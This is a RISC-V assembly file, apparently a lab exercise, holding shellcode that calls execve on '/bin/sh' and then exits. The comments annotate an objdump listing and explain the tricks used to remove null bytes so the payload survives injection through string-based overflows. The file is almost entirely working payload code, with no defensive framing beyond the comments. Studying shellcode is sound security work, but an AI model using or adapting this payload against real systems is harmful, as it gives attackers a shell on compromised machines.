.section .text
.globl _start

#0000000000010078 <_start>:
#   10078:	6e696537          	lui	a0,0x6e696
#   1007c:	22f5051b          	addiw	a0,a0,559
#   10080:	1161                	addi	sp,sp,-8
#   10082:	e02a                	sd	a0,0(sp)
#   10084:	00687537          	lui	a0,0x687 <
#   10088:	32f5051b          	addiw	a0,a0,815
#   1008c:	00a13223          	sd	a0,4(sp) <
#   10090:	4501                	li	a0,0
#   10092:	00010513          	mv	a0,sp <
#   10096:	4601                	li	a2,0
#   10098:	4581                	li	a1,0
#   1009a:	0dd00893          	li	a7,221 <
#   1009e:	00000073          	ecall
#   100a2:	4501                	li	a0,0
#   100a4:	4881                	li	a7,0
#   100a6:	05d88893          	addi	a7,a7,93
#   100aa:	00000073          	ecall

# 4 problem spots
# - the "/bin/sh\0" inheritely has a null
# - store using a0 for the stack pointer has a null
# - the addi is getting translated to mv
# - the li for the syscall contains a null

# 4 solutions
# - change "/bin/sh\0" to "//bin/sh", which fills the buffer and removes the NULL
# - move the register to a higher value to shift the bits to a non-null value, I chose a7 since it was cleared later anyway
# - change the addi to have a value inside of another register (similar to above) and then add the negative value later
# - more arithmetic magic to make it work

_start:
	    li a0,0x69622f2f #ib//
	    addi sp,sp,-8
	    sd a0,0(sp)
	    li a7,0x68732f6e # hs/n 
	    sd a7,4(sp)
	    li a7,0x0
	    addi a7,sp,0x11
	    li a0,0
	    addi a0,a7,-0x11
	    li a2,0x0
	    li a1,0x0
	    li a7,0x1
	    addi a7,a7,220
	    #li a7, 221 #221 is the __NR_execve 
	    ecall
	    li a0, 0x0
	    li a7, 0x0
	    addi a7,a7,93
	    ecall
